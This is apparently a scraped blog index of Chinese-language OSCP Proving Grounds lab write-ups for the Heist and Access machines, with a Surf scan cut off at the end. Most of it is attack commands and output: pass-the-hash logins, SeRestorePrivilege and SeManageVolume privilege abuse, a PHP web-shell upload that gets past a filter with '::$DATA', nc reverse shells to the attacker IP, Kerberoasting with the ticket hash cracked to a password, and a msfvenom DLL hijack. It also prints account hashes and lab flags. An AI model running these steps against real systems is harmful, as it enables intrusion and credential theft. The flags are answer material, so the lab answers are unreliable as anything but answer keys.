HEIST.OFFSEC [*] Salt : HEIST.OFFSECsvc_apache$ [*] rc4_hmac : 0AFF0D9DFA8B436E6688697B0A47B50C [*] aes128_cts_hmac_sha1 : C958BEE96DEE78F9035F460B91EC6D86 [*] aes256_cts_hmac_sha1 : D3C18DAF21128CAFEAECE5BFF6599A0A4DFB2E9BE22F6CFE13677688B0A34988 [*] des_cbc_md5 : 0804169DCECB6102 用当前Hash值使用Evil-WinRM进行登录 ┌──(xavier㉿kali)-[~/Desktop/OSCP/PG_Practice/Heist] └─$ evil-winrm -u 'svc_apache$' -H '0AFF0D9DFA8B436E6688697B0A47B50C' -i 192.168.201.165 Evil-WinRM shell v3.4 Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\\Users\\svc_apache$\\Documents\u003e whoami heist\\svc_apache$ *Evil-WinRM* PS C:\\Users\\svc_apache$\\Documents\u003e 检查当前用户权限 *Evil-WinRM* PS C:\\Users\\svc_apache$\\Documents\u003e whoami /priv PRIVILEGES INFORMATION ---------------------- Privilege Name Description State ============================= ============================== ======= SeMachineAccountPrivilege Add workstations to domain Enabled SeRestorePrivilege Restore files and directories Enabled SeChangeNotifyPrivilege Bypass traverse checking Enabled SeIncreaseWorkingSetPrivilege Increase a process working set Enabled 发现有SeRestorePrivilege权限，可以利用 ","date":"2024-02-06","objectID":"/posts/provinggrounds-heist/:4:1","tags":["OSCP","PG_Practice"],"title":"ProvingGrounds Heist Writeup","uri":"/posts/provinggrounds-heist/"},{"categories":["靶场"],"content":"SeRestorePrivilege 这里使用SeRestoreAbuse进行提权。编译好后将其上传。 # 执行报错 *Evil-WinRM* PS C:\\Users\\svc_apache$\\Documents\u003e ./SeRestoreAbuse.exe \"cmd /c whoami\" # 有报错，但是nc执行了，执行一段时间后就会断开 *Evil-WinRM* PS C:\\Users\\svc_apache$\\Documents\u003e ./SeRestoreAbuse.exe \"C:\\tmp\\nc.exe 192.168.45.222 4444 -e powershell\" ┌──(xavier㉿kali)-[~/Desktop/OSCP/PG_Practice/Heist] └─$ nc -nlvp 4444 listening on [any] 4444 ... connect to [192.168.45.222] from (UNKNOWN) [192.168.201.165] 50526 Windows PowerShell Copyright (C) Microsoft Corporation. All rights reserved. PS C:\\Windows\\system32\u003e whoami whoami nt authority\\system PS C:\\Windows\\system32\u003e dir C:\\users\\administrator\\desktop\\ dir C:\\users\\administrator\\desktop\\ Directory: C:\\users\\administrator\\desktop Mode LastWriteTime Length Name ---- ------------- ------ ---- -a---- 2/5/2024 9:21 PM 34 proof.txt 那就只能在nc执行期间，迅速的再建立一个shell ┌──(xavier㉿kali)-[~/Desktop/OSCP/PG_Practice/Heist] └─$ nc -nlvp 4444 listening on [any] 4444 ... connect to [192.168.45.222] from (UNKNOWN) [192.168.201.165] 50531 Windows PowerShell Copyright (C) Microsoft Corporation. All rights reserved. PS C:\\Windows\\system32\u003e C:\\tmp\\nc.exe 192.168.45.222 5555 -e powershell C:\\tmp\\nc.exe 192.168.45.222 5555 -e powershell ┌──(xavier㉿kali)-[~/Desktop/OSCP/PG_Practice/Heist] └─$ nc -nlvp 5555 listening on [any] 5555 ... connect to [192.168.45.222] from (UNKNOWN) [192.168.201.165] 50534 Windows PowerShell Copyright (C) Microsoft Corporation. All rights reserved. PS C:\\Windows\\system32\u003e type C:\\users\\administrator\\desktop\\proof.txt type C:\\users\\administrator\\desktop\\proof.txt 4af2fa343310e6880347c964d98caea1 PS C:\\Windows\\system32\u003e ","date":"2024-02-06","objectID":"/posts/provinggrounds-heist/:4:2","tags":["OSCP","PG_Practice"],"title":"ProvingGrounds Heist Writeup","uri":"/posts/provinggrounds-heist/"},{"categories":["靶场"],"content":"Flag type C:\\Users\\enox\\Desktop\\local.txt 6d070d8770a2ef6468fab560c6f886f1 type C:\\users\\administrator\\desktop\\proof.txt 4af2fa343310e6880347c964d98caea1 ","date":"2024-02-06","objectID":"/posts/provinggrounds-heist/:5:0","tags":["OSCP","PG_Practice"],"title":"ProvingGrounds Heist Writeup","uri":"/posts/provinggrounds-heist/"},{"categories":["靶场"],"content":"Access 第14台，Windows系统，难度中等Intermediate，名称 Access IP：192.168.xx.187 ","date":"2024-01-12","objectID":"/posts/provinggrounds-access/:1:0","tags":["OSCP","PG_Practice"],"title":"ProvingGrounds Access Writeup","uri":"/posts/provinggrounds-access/"},{"categories":["靶场"],"content":"Port ┌──(xavier㉿kali)-[~/Desktop/OSCP/PG_Practice/Access] └─$ sudo nmap -n -r --min-rate=3500 -sSV -T4 192.168.167.187 [sudo] xavier 的密码： Starting Nmap 7.94 ( https://nmap.org ) at 2024-01-11 23:53 CST Nmap scan report for 192.168.167.187 Host is up (0.17s latency). Not shown: 988 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 80/tcp open http Apache httpd 2.4.48 ((Win64) OpenSSL/1.1.1k PHP/8.0.7) 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2024-01-11 15:53:35Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: access.offsec0., Site: Default-First-Site-Name) 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: access.offsec0., Site: Default-First-Site-Name) 3269/tcp open tcpwrapped Service Info: Host: SERVER; OS: Windows; CPE: cpe:/o:microsoft:windows Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 18.97 seconds ","date":"2024-01-12","objectID":"/posts/provinggrounds-access/:2:0","tags":["OSCP","PG_Practice"],"title":"ProvingGrounds Access Writeup","uri":"/posts/provinggrounds-access/"},{"categories":["靶场"],"content":"Init Access ","date":"2024-01-12","objectID":"/posts/provinggrounds-access/:3:0","tags":["OSCP","PG_Practice"],"title":"ProvingGrounds Access Writeup","uri":"/posts/provinggrounds-access/"},{"categories":["靶场"],"content":"53-DNS 域传送失败 ┌──(xavier㉿kali)-[~] └─$ dnsrecon -d access.offsec -n 192.168.167.187 -t axfr [*] Checking for Zone Transfer for access.offsec name servers [*] Resolving SOA Record [+] SOA server.access.offsec 192.168.167.187 [*] Resolving NS Records [*] NS Servers found: [+] NS server.access.offsec 192.168.167.187 [*] Removing any duplicate NS server IP Addresses... [*] [*] Trying NS server 192.168.167.187 [+] 192.168.167.187 Has port 53 TCP Open [-] Zone Transfer Failed (Zone transfer error: REFUSED) ","date":"2024-01-12","objectID":"/posts/provinggrounds-access/:3:1","tags":["OSCP","PG_Practice"],"title":"ProvingGrounds Access Writeup","uri":"/posts/provinggrounds-access/"},{"categories":["靶场"],"content":"88-Kerberos 域用户爆破 ┌──(xavier㉿kali)-[~] └─$ sudo nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm=\"access.offsec\",userdb=\"/usr/share/wordlists/seclists/Usernames/Names/names.txt\" 192.168.167.187 无成果 ","date":"2024-01-12","objectID":"/posts/provinggrounds-access/:3:2","tags":["OSCP","PG_Practice"],"title":"ProvingGrounds Access Writeup","uri":"/posts/provinggrounds-access/"},{"categories":["靶场"],"content":"80-http Web扫描 ┌──(xavier㉿kali)-[~/Desktop/OSCP/PG_Practice/Access] └─$ dirsearch -x 400,403,404 -t 500 -e php,ini,txt,bak -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.167.187 ┌──(xavier㉿kali)-[~/Desktop/OSCP/PG_Practice/Access] └─$ dirsearch -x 400,404 -t 500 -e php,ini,txt,bak -u http://192.168.167.187 发下如下： http://192.168.167.187/cgi-bin/printenv.pl # 系统环境信息 对Web页面进行信息搜集，发现一个文件上传功能点 尝试上传PHP文件失败 尝试绕过 Web扫描时发现有 ┌──(xavier㉿kali)-[~/Desktop/OSCP/PG_Practice/Access] └─$ dirsearch -x 400,404 -t 500 -e php,ini,txt,bak -u http://192.168.167.187 …… [00:08:28] 301 - 344B - /uploads -\u003e http://192.168.167.187/uploads/ [00:08:28] 403 - 304B - /web.config::$DATA [00:08:29] 403 - 423B - /webalizer 尝试使用::$DATA进行文件上传绕过，成功。 POST /Ticket.php HTTP/1.1 Host: 192.168.167.187 User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:102.0) Gecko/20100101 Firefox/102.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Content-Type: multipart/form-data; boundary=---------------------------29739589853663594743950605566 Content-Length: 782 Origin: http://192.168.167.187 Connection: close Referer: http://192.168.167.187/ Upgrade-Insecure-Requests: 1 -----------------------------29739589853663594743950605566 Content-Disposition: form-data; name=\"your-name\" tst -----------------------------29739589853663594743950605566 Content-Disposition: form-data; name=\"your-email\" test@test.com -----------------------------29739589853663594743950605566 Content-Disposition: form-data; name=\"ticket-type\" standard-access -----------------------------29739589853663594743950605566 Content-Disposition: form-data; name=\"the_file\"; filename=\"test.PHP::$DATA\" Content-Type: application/x-php \u003c?php echo 123; echo system($_REQUEST['cmd']); ?\u003e -----------------------------29739589853663594743950605566 Content-Disposition: form-data; name=\"submit\" Purchase -----------------------------29739589853663594743950605566-- 在uploads目录下找到所上传的文件，命令执行成功 ┌──(xavier㉿kali)-[~/Desktop/OSCP/PG_Practice/Access] └─$ curl \"http://192.168.167.187/uploads/test.PHP?cmd=whoami\" 123access\\svc_apache access\\svc_apache 下载nc，并进行反弹shell cmd=mkdir+C:\\tmp\\ cmd=dir+C:\\tmp\\ cmd=curl+http://192.168.45.169/nc64.exe+-o+C:\\tmp\\nc.exe cmd=C:\\tmp\\nc.exe+192.168.45.169+443+-e+powershell ┌──(xavier㉿kali)-[~/Desktop/OSCP/PG_Practice/Access] └─$ nc -nlvp 443 listening on [any] 443 ... connect to [192.168.45.169] from (UNKNOWN) [192.168.167.187] 50217 Windows PowerShell Copyright (C) Microsoft Corporation. All rights reserved. PS C:\\xampp\\htdocs\\uploads\u003e whoami whoami access\\svc_apache PS C:\\xampp\\htdocs\\uploads\u003e ","date":"2024-01-12","objectID":"/posts/provinggrounds-access/:3:3","tags":["OSCP","PG_Practice"],"title":"ProvingGrounds Access Writeup","uri":"/posts/provinggrounds-access/"},{"categories":["靶场"],"content":"PrivE 上传工具 PS C:\\tmp\u003e curl http://192.168.45.169/winPEASany.exe -o C:\\tmp\\winPEASany.exe PS C:\\tmp\u003e dir PS C:\\tmp\u003e ./winPEASany.exe \u003e 1.txt ","date":"2024-01-12","objectID":"/posts/provinggrounds-access/:4:0","tags":["OSCP","PG_Practice"],"title":"ProvingGrounds Access Writeup","uri":"/posts/provinggrounds-access/"},{"categories":["靶场"],"content":"SPN 在当前用户下没有local.txt文件，注意到还有另一个svc_mssql账户 PS C:\\tmp\u003e dir C:\\users\\ Directory: C:\\users Mode LastWriteTime Length Name ---- ------------- ------ ---- d----- 5/28/2021 3:53 AM Administrator d-r--- 5/28/2021 3:53 AM Public d----- 4/8/2022 2:39 AM svc_apache d----- 4/8/2022 2:40 AM svc_mssql 搜集SPN，测试过程中发现kali自带的empire下的get-spn.ps1无法实现效果，于是从网上找了一个脚本，地址：https://github.com/compwiz32/PowerShell/blob/master/Get-SPN.ps1 # Source / credit: # https://social.technet.microsoft.com/wiki/contents/articles/18996.active-directory-powershell-script-to-list-all-spns-used.aspx cls $search = New-Object DirectoryServices.DirectorySearcher([ADSI]\"\") $search.filter = \"(servicePrincipalName=*)\" ## You can use this to filter for OU's: ## $results = $search.Findall() | ?{ $_.path -like '*OU=whatever,DC=whatever,DC=whatever*' } $results = $search.Findall() foreach( $result in $results ) { $userEntry = $result.GetDirectoryEntry() Write-host \"Object Name = \" $userEntry.name -backgroundcolor \"yellow\" -foregroundcolor \"black\" Write-host \"DN = \" $userEntry.distinguishedName Write-host \"Object Cat. = \" $userEntry.objectCategory Write-host \"servicePrincipalNames\" $i=1 foreach( $SPN in $userEntry.servicePrincipalName ) { Write-host \"SPN(\" $i \") = \" $SPN $i+=1 } Write-host \"\" } svc_mssql的SPN为 MSSQLSvc/DC.access.offsec PS C:\\tmp\u003e iwr -uri http://192.168.45.169/Get-SPN.ps1 -o Get-SPN.ps1 iwr -uri http://192.168.45.169/Get-SPN.ps1 -o Get-SPN.ps1 PS C:\\tmp\u003e ./Get-SPN.ps1 ./Get-SPN.ps1 Object Name = SERVER DN = CN=SERVER,OU=Domain Controllers,DC=access,DC=offsec Object Cat. = CN=Computer,CN=Schema,CN=Configuration,DC=access,DC=offsec servicePrincipalNames SPN( 1 ) = Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04/SERVER.access.offsec SPN( 2 ) = ldap/SERVER.access.offsec/ForestDnsZones.access.offsec SPN( 3 ) = ldap/SERVER.access.offsec/DomainDnsZones.access.offsec SPN( 4 ) = DNS/SERVER.access.offsec SPN( 5 ) = GC/SERVER.access.offsec/access.offsec SPN( 6 ) = RestrictedKrbHost/SERVER.access.offsec SPN( 7 ) = RestrictedKrbHost/SERVER SPN( 8 ) = RPC/20dae709-54fe-40ec-8c68-4475793b542a._msdcs.access.offsec SPN( 9 ) = HOST/SERVER/ACCESS SPN( 10 ) = HOST/SERVER.access.offsec/ACCESS SPN( 11 ) = HOST/SERVER SPN( 12 ) = HOST/SERVER.access.offsec SPN( 13 ) = HOST/SERVER.access.offsec/access.offsec SPN( 14 ) = E3514235-4B06-11D1-AB04-00C04FC2DCD2/20dae709-54fe-40ec-8c68-4475793b542a/access.offsec SPN( 15 ) = ldap/SERVER/ACCESS SPN( 16 ) = ldap/20dae709-54fe-40ec-8c68-4475793b542a._msdcs.access.offsec SPN( 17 ) = ldap/SERVER.access.offsec/ACCESS SPN( 18 ) = ldap/SERVER SPN( 19 ) = ldap/SERVER.access.offsec SPN( 20 ) = ldap/SERVER.access.offsec/access.offsec Object Name = krbtgt DN = CN=krbtgt,CN=Users,DC=access,DC=offsec Object Cat. = CN=Person,CN=Schema,CN=Configuration,DC=access,DC=offsec servicePrincipalNames SPN( 1 ) = kadmin/changepw Object Name = MSSQL DN = CN=MSSQL,CN=Users,DC=access,DC=offsec Object Cat. = CN=Person,CN=Schema,CN=Configuration,DC=access,DC=offsec servicePrincipalNames SPN( 1 ) = MSSQLSvc/DC.access.offsec PS C:\\tmp\u003e ","date":"2024-01-12","objectID":"/posts/provinggrounds-access/:4:1","tags":["OSCP","PG_Practice"],"title":"ProvingGrounds Access Writeup","uri":"/posts/provinggrounds-access/"},{"categories":["靶场"],"content":"Ticket 接下去获取svc_mssql的票据，使用如下命令将ticket存储在内存中： PS C:\\tmp\u003e Add-Type -AssemblyName System.IdentityModel Add-Type -AssemblyName System.IdentityModel PS C:\\tmp\u003e New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList 'MSSQLSvc/DC.access.offsec' New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList 'MSSQLSvc/DC.access.offsec' Id : uuid-b4d9ac78-ba0f-45f4-8020-5dec3d5e6101-1 SecurityKeys : {System.IdentityModel.Tokens.InMemorySymmetricSecurityKey} ValidFrom : 1/11/2024 5:44:07 PM ValidTo : 1/12/2024 3:44:07 AM ServicePrincipalName : MSSQLSvc/DC.access.offsec SecurityKey : System.IdentityModel.Tokens.InMemorySymmetricSecurityKey 利用Empire 的 Invoke-Kerberoast.ps1 导出内存中的Kerberoast hash PS C:\\tmp\u003e iex(new-object net.webclient).downloadString('http://192.168.45.169/Invoke-Kerberoast.ps1'); Invoke-Kerberoast -OutputFormat Hashcat TicketByteHexStream : Hash : $krb5tgs$23$*svc_mssql$access.offsec$MSSQLSvc/DC.access.offsec*$600077ADCF96E989D8C9A8D1AE325F08 $A0DA4C8A4C76EB098A4567BBCA91C9883EAA1F35C75428CEE9F738D9044A5F0F41153B51832DA55E14097C267EA14BF 88A9861E14500A2E1E3D8E95269FD34FEA33A40EFF9658E40C8DADFDD868D17A49BDCD72575BBF060267B0F4F7617BFF 028165312F9D575F2189828715749CABD5AD9308D4BE166A4B3B3736ECFEC98367F0E43E93DE1E498F86AF3E8AB9B446 3448467DCBD60E25B8051656976F5D1B9DFCB02D3FABC7B1578FEC8570B4D606E6EADCC8A0BA80C9F2C1F2B395F46A2E 98008B02B42DABEF1800C3264B7BE558FFFF96FDC93D9133166124308C0CD7548827E217821ED41C05C1904665C711F9 E21C964A98A94D2568EF863542259C31B36457D146B93FAA8B682E48C49B1281C54D56051406869FE8683DF28D38A5BD 48503640ABBEB4AF5DDDA28046377D80D8A018D38E50EC925FD845838EFA60D34AA29E4BC1A1B0B54A8929546C9DC642 866C34ED547590237A04DE24E76D774467A7F42836C5ED87D9A50E0C7C225B7F107F16135CE4063507BC8B9DA72AD454 92FBFC6E37B946A0D66D109D4C41923D174B63F3AB9C41B2F8DFD814B0B01C9178B48C0C851FD623E8FEAB6FCC83BCF7 358C87BF4D3CAABF382DFB4E660116DA8604CFD0C83847064DF06CF15479583E7D108552E5E914DD6DBB12CA6AE6561B 85F54A84ECBD92CA3C64EA8D27D80904E5FB0554B7FC04A3C49A237BB12D7D22D5384C1A7A7F81E1C8CC22A9C9C860F4 F66D4F469FDD8D02752E547A604627EA2C1CE1110D7F4B5BA374DF19E5CD003F7F9ACEBCD65346276503E304D98E952A 2ACE9586F012BDAB4DAB26A176A93B0F82CA65A7D39175DC2A9F14BD8B6B9079AE1324E0A64CF24539A616012773C0E3 214C62366F1F4FE67508262DD9402DB08A93B8485C3E61E843788517AD4B70A937667585493540EE55837097DA324686 EA8AE61DAA9F6B4CB4AA98D2E870DEFEB33DD2BFBE0C7758E57EB3C10F08B67484339CB877C327B63A1D37E5FDFD9478 35BCBB3B24A742C64CF98316B20C14973A8A32C61A739E7B0C40D59777C2BE502E79AC51571E9A1E3A8F9AC8BB8B024D 742106656D1F4CBA5D5C7DB50D2EFA204A50ABC665F6BB86B1DC18F9A8C3E4F7413BFCB2B504F6C353709CE120885AD6 2A7A11F22D2F4B95A7B2D8ADE89F25A344CE6E85B4A1E33072D43A7838A25DCBFFC7110E559C15D54C39BC4BD287387A C4099BF18D926CD464F9A4F2927DA5944360A8ECB1CC5998AF1017554E58CCE2E1BEDBD4A0BC4DEAEB97F914BA05B184 D522ACA5FA8FEF3F5DAC9D71C1E0C7A8E72AD7D98C114C156A05D695AC5CDBEFAD407BB65FBFE8955E58C4DE0519EBBA 102F46241BD2C3EE053FF2E5D78493CDF75CC113CF3FC3A72E0B22F24D9845385A8613C5E30DA408D7095806607EBD04 797BF7FE35EB5AF096B0A144D92B103C9FB30F150C2EEFAC49737DEBF38B781822E39409BCFF12657F2E1CFDB0DA7168 EFA2DD9CB42D6694C4FF65AEC36E529E4DD06E66384E7AEF3AF37A9F45DC9DCC99C57F5E94A36661517037FBC81FEF72 81940B899A369EC5EC91804161EDA0B3E4BA39E7957A85027DB3825FA0AA490B74514 SamAccountName : svc_mssql DistinguishedName : CN=MSSQL,CN=Users,DC=access,DC=offsec ServicePrincipalName : MSSQLSvc/DC.access.offsec ","date":"2024-01-12","objectID":"/posts/provinggrounds-access/:4:2","tags":["OSCP","PG_Practice"],"title":"ProvingGrounds Access Writeup","uri":"/posts/provinggrounds-access/"},{"categories":["靶场"],"content":"Crack Hash 整理hash格式写入文件 使用hashcat进行破解 ┌──(xavier㉿kali)-[~/Desktop/OSCP/PG_Practice/Access] └─$ hashcat -m 13100 mssql.hash /usr/share/wordlists/rockyou.txt --force -a 0 --show $krb5tgs$23$*svc_mssql$access.offsec$MSSQLSvc/DC.access.offsec*$600077adcf96e989d8c9a8d1ae325f08$a0da4c8a4c76eb098a4567bbca91c9883eaa1f35c75428cee9f738d9044a5f0f41153b51832da55e14097c267ea14bf88a9861e14500a2e1e3d8e95269fd34fea33a40eff9658e40c8dadfdd868d17a49bdcd72575bbf060267b0f4f7617bff028165312f9d575f2189828715749cabd5ad9308d4be166a4b3b3736ecfec98367f0e43e93de1e498f86af3e8ab9b4463448467dcbd60e25b8051656976f5d1b9dfcb02d3fabc7b1578fec8570b4d606e6eadcc8a0ba80c9f2c1f2b395f46a2e98008b02b42dabef1800c3264b7be558ffff96fdc93d9133166124308c0cd7548827e217821ed41c05c1904665c711f9e21c964a98a94d2568ef863542259c31b36457d146b93faa8b682e48c49b1281c54d56051406869fe8683df28d38a5bd48503640abbeb4af5ddda28046377d80d8a018d38e50ec925fd845838efa60d34aa29e4bc1a1b0b54a8929546c9dc642866c34ed547590237a04de24e76d774467a7f42836c5ed87d9a50e0c7c225b7f107f16135ce4063507bc8b9da72ad45492fbfc6e37b946a0d66d109d4c41923d174b63f3ab9c41b2f8dfd814b0b01c9178b48c0c851fd623e8feab6fcc83bcf7358c87bf4d3caabf382dfb4e660116da8604cfd0c83847064df06cf15479583e7d108552e5e914dd6dbb12ca6ae6561b85f54a84ecbd92ca3c64ea8d27d80904e5fb0554b7fc04a3c49a237bb12d7d22d5384c1a7a7f81e1c8cc22a9c9c860f4f66d4f469fdd8d02752e547a604627ea2c1ce1110d7f4b5ba374df19e5cd003f7f9acebcd65346276503e304d98e952a2ace9586f012bdab4dab26a176a93b0f82ca65a7d39175dc2a9f14bd8b6b9079ae1324e0a64cf24539a616012773c0e3214c62366f1f4fe67508262dd9402db08a93b8485c3e61e843788517ad4b70a937667585493540ee55837097da324686ea8ae61daa9f6b4cb4aa98d2e870defeb33dd2bfbe0c7758e57eb3c10f08b67484339cb877c327b63a1d37e5fdfd947835bcbb3b24a742c64cf98316b20c14973a8a32c61a739e7b0c40d59777c2be502e79ac51571e9a1e3a8f9ac8bb8b024d742106656d1f4cba5d5c7db50d2efa204a50abc665f6bb86b1dc18f9a8c3e4f7413bfcb2b504f6c353709ce120885ad62a7a11f22d2f4b95a7b2d8ade89f25a344ce6e85b4a1e33072d43a7838a25dcbffc7110e559c15d54c39bc4bd287387ac4099bf18d926cd464f9a4f2927da5944360a8ecb1cc5998af1017554e58cce2e1bedbd4a0bc4deaeb97f914ba05b184d522aca5fa8fef3f5dac9d71c1e0c7a8e72ad7d98c114c156a05d695ac5cdbefad407bb65fbfe8955e58c4de0519ebba102f46241bd2c3ee053ff2e5d78493cdf75cc113cf3fc3a72e0b22f24d9845385a8613c5e30da408d7095806607ebd04797bf7fe35eb5af096b0a144d92b103c9fb30f150c2eefac49737debf38b781822e39409bcff12657f2e1cfdb0da7168efa2dd9cb42d6694c4ff65aec36e529e4dd06e66384e7aef3af37a9f45dc9dcc99c57f5e94a36661517037fbc81fef7281940b899a369ec5ec91804161eda0b3e4ba39e7957a85027db3825fa0aa490b74514:trustno1 ","date":"2024-01-12","objectID":"/posts/provinggrounds-access/:4:3","tags":["OSCP","PG_Practice"],"title":"ProvingGrounds Access Writeup","uri":"/posts/provinggrounds-access/"},{"categories":["靶场"],"content":"RunasCs 接下去需要获取mssql身份的反弹shell，可以使用\"Invoke-RunasCs.ps1“这个脚本 PS C:\\tmp\u003e curl https://raw.githubusercontent.com/antonioCoco/RunasCs/master/Invoke-RunasCs.ps1 -o Invoke-RunasCs.ps1 curl https://raw.githubusercontent.com/antonioCoco/RunasCs/master/Invoke-RunasCs.ps1 -o Invoke-RunasCs.ps1 PS C:\\tmp\u003e ls Directory: C:\\tmp Mode LastWriteTime Length Name ---- ------------- ------ ---- -a---- 1/11/2024 8:50 AM 498700 1.txt -a---- 1/11/2024 9:06 AM 0 2.txt -a---- 1/11/2024 9:38 AM 883 Get-SPN.ps1 -a---- 1/11/2024 9:46 AM 46818 Invoke-Kerberoast.ps1 -a---- 1/11/2024 10:09 AM 88284 Invoke-RunasCs.ps1 -a---- 1/11/2024 8:45 AM 43696 nc.exe -a---- 1/11/2024 8:49 AM 2029568 winPEASany.exe PS C:\\tmp\u003e import-module ./Invoke-RunasCs.ps1 import-module ./Invoke-RunasCs.ps1 PS C:\\tmp\u003e Invoke-RunasCs -Username svc_mssql -Password trustno1 -Command \"whoami\" Invoke-RunasCs -Username svc_mssql -Password trustno1 -Command \"whoami\" [*] Warning: The logon for user 'svc_mssql' is limited. Use the flag combination --bypass-uac and --logon-type '8' to obtain a more privileged token. access\\svc_mssql PS C:\\tmp\u003e Invoke-RunasCs -Username svc_mssql -Password trustno1 -Command \"C:\\tmp\\nc.exe 192.168.45.169 7777 -e powershell\" Invoke-RunasCs -Username svc_mssql -Password trustno1 -Command \"C:\\tmp\\nc.exe 192.168.45.169 7777 -e powershell\" [*] Warning: The logon for user 'svc_mssql' is limited. Use the flag combination --bypass-uac and --logon-type '8' to obtain a more privileged token. PS C:\\Windows\\system32\u003e cd C:\\users\\svc_mssql\\Desktop\\ cd C:\\users\\svc_mssql\\Desktop\\ PS C:\\users\\svc_mssql\\Desktop\u003e cat local.txt cat local.txt ac7cd92298a3ec65de98ea4c51f9e95e ","date":"2024-01-12","objectID":"/posts/provinggrounds-access/:4:4","tags":["OSCP","PG_Practice"],"title":"ProvingGrounds Access Writeup","uri":"/posts/provinggrounds-access/"},{"categories":["靶场"],"content":"PrivE 再次进行信息搜集 发现当前用户权限如下： PS C:\\tmp\u003e whoami /priv whoami /priv PRIVILEGES INFORMATION ---------------------- Privilege Name Description State ============================= ================================ ======== SeMachineAccountPrivilege Add workstations to domain Disabled SeChangeNotifyPrivilege Bypass traverse checking Enabled SeManageVolumePrivilege Perform volume maintenance tasks Disabled SeIncreaseWorkingSetPrivilege Increase a process working set Disabled 其中SeManageVolumePrivilege权限可被用于提权，相关链接：https://github.com/xct/SeManageVolumeAbuse 需要用vs stuido手动编译一下 PS C:\\tmp\u003e curl http://192.168.45.169/SeManageVolumeAbuse.exe -o SeManageVolumeAbuse.exe curl http://192.168.45.169/SeManageVolumeAbuse.exe -o SeManageVolumeAbuse.exe PS C:\\tmp\u003e ./SeManageVolumeAbuse.exe ./SeManageVolumeAbuse.exe Success! Permissions changed. PS C:\\tmp\u003e icacls C:/windows icacls C:/windows C:/windows NT SERVICE\\TrustedInstaller:(F) NT SERVICE\\TrustedInstaller:(CI)(IO)(F) NT AUTHORITY\\SYSTEM:(M) NT AUTHORITY\\SYSTEM:(OI)(CI)(IO)(F) BUILTIN\\Users:(M) BUILTIN\\Users:(OI)(CI)(IO)(F) BUILTIN\\Users:(RX) BUILTIN\\Users:(OI)(CI)(IO)(GR,GE) CREATOR OWNER:(OI)(CI)(IO)(F) APPLICATION PACKAGE AUTHORITY\\ALL APPLICATION PACKAGES:(RX) APPLICATION PACKAGE AUTHORITY\\ALL APPLICATION PACKAGES:(OI)(CI)(IO)(GR,GE) APPLICATION PACKAGE AUTHORITY\\ALL RESTRICTED APPLICATION PACKAGES:(RX) APPLICATION PACKAGE AUTHORITY\\ALL RESTRICTED APPLICATION PACKAGES:(OI)(CI)(IO)(GR,GE) Successfully processed 1 files; Failed processing 0 files PS C:\\tmp\u003e 接下去要上传 tzres.dll到 C:\\Windows\\System32\\wbem\\tzres.dll，再通过systeminfo命令去触发它 使用msfvenom生成一个64位反弹shell的dll文件 ┌──(xavier㉿kali)-[~/Desktop/OSCP/PG_Practice/Access] └─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.169 LPORT=4444 -f dll -o tzres.dll [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload [-] No arch selected, selecting arch: x64 from the payload No encoder specified, outputting raw payload Payload size: 460 bytes Final size of dll file: 9216 bytes Saved as: tzres.dll PS C:\\tmp\u003e curl http://192.168.45.169/tzres.dll -o tzres.dll curl http://192.168.45.169/tzres.dll -o tzres.dll PS C:\\tmp\u003e cp tzres.dll C:\\Windows\\System32\\wbem\\tzres.dll cp tzres.dll C:\\Windows\\System32\\wbem\\tzres.dll PS C:\\tmp\u003e systeminfo \u003e 5.txt systeminfo \u003e 5.txt systeminfo : ERROR: The remote procedure call failed. At line:1 char:1 + systeminfo \u003e 5.txt + ~~~~~~~~~~~~~~~~~~ + CategoryInfo : NotSpecified: (ERROR: The remote procedure call failed.:String) [], RemoteException + FullyQualifiedErrorId : NativeCommandError PS C:\\tmp\u003e 收到反弹shell： ┌──(xavier㉿kali)-[~/Desktop/OSCP/PG_Practice/Access] └─$ nc -nlvp 4444 listening on [any] 4444 ... connect to [192.168.45.169] from (UNKNOWN) [192.168.167.187] 50960 Microsoft Windows [Version 10.0.17763.2746] (c) 2018 Microsoft Corporation. All rights reserved. C:\\Windows\\system32\u003ewhoami whoami nt authority\\network service C:\\Windows\\system32\u003ecd C:\\users\\administrator\\desktop\\ cd C:\\users\\administrator\\desktop\\ C:\\Users\\Administrator\\Desktop\u003etype proof.txt type proof.txt d0be636ebf08cd4c91a276012f25a135 ","date":"2024-01-12","objectID":"/posts/provinggrounds-access/:5:0","tags":["OSCP","PG_Practice"],"title":"ProvingGrounds Access Writeup","uri":"/posts/provinggrounds-access/"},{"categories":["靶场"],"content":"端口扫描： 整理 ┌──(xavier㉿kali)-[~/Desktop/OSCP/PG_Practice/surf] └─$ sudo nmap -n -r --min-rate=3500 -p- -sSV --script default,vuln 192.168.162.171 -oN surf-all.txt [sudo] xavier 的密码： Starting Nmap 7.94 ( https://nmap.org ) at 2023-12-03 14:59 CST Nmap scan report for 192.168.162.171 Host is up (0.22s latency). Not shown: 65533 closed tcp ports (reset) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0) | vulners: CVEs | ssh-hostkey: 